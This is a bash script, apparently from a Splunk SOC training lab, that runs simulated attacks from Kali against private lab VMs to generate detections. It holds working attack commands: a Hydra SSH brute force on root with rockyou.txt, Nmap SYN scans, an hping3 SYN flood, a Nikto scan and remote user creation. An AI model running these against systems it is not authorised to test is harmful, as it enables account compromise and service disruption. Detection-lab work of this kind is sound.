#!/bin/bash
# ============================================================
# attack-sim.sh — SOC Lab Attack Simulation Script
# Run from: Kali (192.168.225.30)
# Usage: bash attack-sim.sh [all|ssh|scan|ddos|web|useradd]
# ============================================================

TARGET_VM2="192.168.225.20"
TARGET_VM1="192.168.225.10"
LOG_FILE="/tmp/attack-sim-$(date +%Y%m%d-%H%M%S).log"
WORDLIST="/usr/share/wordlists/rockyou.txt"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log() { echo -e "${GREEN}[$(date '+%H:%M:%S')]${NC} $1" | tee -a "$LOG_FILE"; }
warn() { echo -e "${YELLOW}[!]${NC} $1" | tee -a "$LOG_FILE"; }
section() { echo -e "\n${RED}[ATTACK]${NC} ══════════ $1 ══════════" | tee -a "$LOG_FILE"; }

# ── Verify dependencies ───────────────────────────────────────
check_deps() {
    local deps=("hydra" "nmap" "hping3" "nikto" "curl")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            warn "$dep not found — installing..."
            sudo apt-get install -y "$dep" &>/dev/null
        fi
    done
    # Decompress rockyou if needed
    if [ ! -f "$WORDLIST" ] && [ -f "${WORDLIST}.gz" ]; then
        sudo gunzip "${WORDLIST}.gz"
    fi
}

# ── Attack 1: SSH Brute Force (MITRE T1110.001) ───────────────
attack_ssh() {
    section "SSH Brute Force — T1110.001"
    log "Target: $TARGET_VM2:22"
    log "Tool: Hydra | Wordlist: rockyou.txt"

    # Use a small subset for speed in lab
    hydra -l root -P "$WORDLIST" ssh://"$TARGET_VM2" \
        -t 4 -w 3 -f \
        -o "/tmp/attack-ssh-$(date +%H%M%S).log" 2>&1 | \
        grep -E "ATTEMPT|found|ERROR" | head -50 | tee -a "$LOG_FILE"

    log "SSH Brute Force simulation complete"
}

# ── Attack 2: Port Scan (MITRE T1046) ─────────────────────────
attack_scan() {
    section "Port Scan — T1046"
    log "Target: $TARGET_VM2"
    log "Tool: Nmap SYN scan | Ports: 1-1000"

    sudo nmap -sS -p 1-1000 "$TARGET_VM2" \
        -oN "/tmp/attack-scan-$(date +%H%M%S).log" 2>&1 | \
        tee -a "$LOG_FILE"

    log "Also scanning VM1 (Splunk)..."
    sudo nmap -sS -p 1-65535 "$TARGET_VM1" \
        -oN "/tmp/attack-scan-vm1-$(date +%H%M%S).log" 2>&1 | \
        tee -a "$LOG_FILE"

    log "Port Scan simulation complete"
}

# ── Attack 3: SYN Flood DDoS (MITRE T1498.001) ────────────────
attack_ddos() {
    section "SYN Flood DDoS — T1498.001"
    log "Target: $TARGET_VM2:22"
    log "Tool: hping3 | Duration: 15 seconds"
    warn "This will generate heavy traffic — running for 15s only"

    sudo timeout 15 hping3 -S --flood -V \
        -p 22 "$TARGET_VM2" 2>&1 | tail -5 | tee -a "$LOG_FILE"

    log "SYN Flood simulation complete"
}

# ── Attack 4: Web Attacks (MITRE T1190) ───────────────────────
attack_web() {
    section "Web Vulnerability Scan — T1190"
    log "Target: http://$TARGET_VM2"

    # Check if Apache is running
    if ! curl -s --connect-timeout 3 "http://$TARGET_VM2" &>/dev/null; then
        warn "No web server on $TARGET_VM2 — skipping Nikto"
        warn "Run scripts/setup-web-target.sh on VM2 first"
        return
    fi

    log "Tool: Nikto web scanner"
    nikto -h "http://$TARGET_VM2" \
        -output "/tmp/attack-web-$(date +%H%M%S).log" \
        -Format txt 2>&1 | tee -a "$LOG_FILE"

    log "Web attack simulation complete"
}

# ── Attack 5: User Creation (MITRE T1136.001) ─────────────────
attack_useradd() {
    section "Simulating New User Alert"
    warn "This requires SSH access to VM2 with sudo"
    log "Creating test user 'hacker' on VM2..."

    ssh rikhlas@"$TARGET_VM2" "sudo useradd -m hacker_test 2>/dev/null; \
        sudo userdel -r hacker_test 2>/dev/null; \
        echo 'User created and deleted for detection test'"

    log "New user simulation complete"
}

# ── Main ───────────────────────────────────────────────────────
MODE="${1:-all}"
echo ""
echo "╔══════════════════════════════════════════════╗"
echo "║     Splunk SOC Lab — Attack Simulator        ║"
echo "║     Target: $TARGET_VM2                 ║"
echo "║     Log: $LOG_FILE    ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

check_deps

case "$MODE" in
    all)
        attack_ssh
        sleep 5
        attack_scan
        sleep 5
        attack_ddos
        sleep 5
        attack_web
        sleep 5
        attack_useradd
        ;;
    ssh)    attack_ssh ;;
    scan)   attack_scan ;;
    ddos)   attack_ddos ;;
    web)    attack_web ;;
    useradd) attack_useradd ;;
    *)
        echo "Usage: $0 [all|ssh|scan|ddos|web|useradd]"
        exit 1
        ;;
esac

echo ""
log "All simulations done. Log saved: $LOG_FILE"
echo ""
